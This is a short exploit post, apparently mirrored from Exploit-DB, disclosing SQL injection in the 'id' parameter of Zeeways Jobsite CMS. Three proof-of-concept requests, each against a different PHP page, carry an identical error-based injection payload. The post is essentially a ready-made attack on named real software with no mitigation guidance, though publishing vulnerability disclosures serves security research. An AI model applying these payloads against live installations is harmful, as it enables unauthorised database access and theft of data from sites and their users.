---
layout:     post
title:      "Zeeways Jobsite CMS - 'id' SQL Injection"
date:       2019-03-25 12:40
author:     "Ahmet Ümit BAYRAM"
category:   exploit
tags:       [sql, sqli, sql injection, exploit-db]
---

# Exploit Title: Zeeways Jobsite CMS - 'id' SQL Injection
# Date: 25.03.2019
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: http://www.zeeways.com/jobsite-cms/1/productdetail
# Demo Site: http://www.zeewayscms.com/jobsite/
# Version: Lastest
# Tested on: Kali Linux
# CVE: N/A

----- PoC 1: SQLi -----

Request: http://localhost/[PATH]/news_details.php?id=1
Vulnerable Parameter: id (GET)
Payload: id=-5236" OR 1 GROUP BY CONCAT(0x716a627871,(SELECT (CASE WHEN
(5640=5640) THEN 1 ELSE 0 END)),0x71626b6271,FLOOR(RAND(0)*2)) HAVING
MIN(0)#

----- PoC 2: SQLi -----

Request: http://localhost/[PATH]/jobs_details.php?id=1
Vulnerable Parameter: id (GET)
Payload: id=-5236" OR 1 GROUP BY CONCAT(0x716a627871,(SELECT (CASE WHEN
(5640=5640) THEN 1 ELSE 0 END)),0x71626b6271,FLOOR(RAND(0)*2)) HAVING
MIN(0)#

----- PoC 3: SQLi -----

Request: http://localhost/[PATH]/job_cmp_details.php?id=1
Vulnerable Parameter: id (GET)
Payload: id=-5236" OR 1 GROUP BY CONCAT(0x716a627871,(SELECT (CASE WHEN
(5640=5640) THEN 1 ELSE 0 END)),0x71626b6271,FLOOR(RAND(0)*2)) HAVING
MIN(0)#
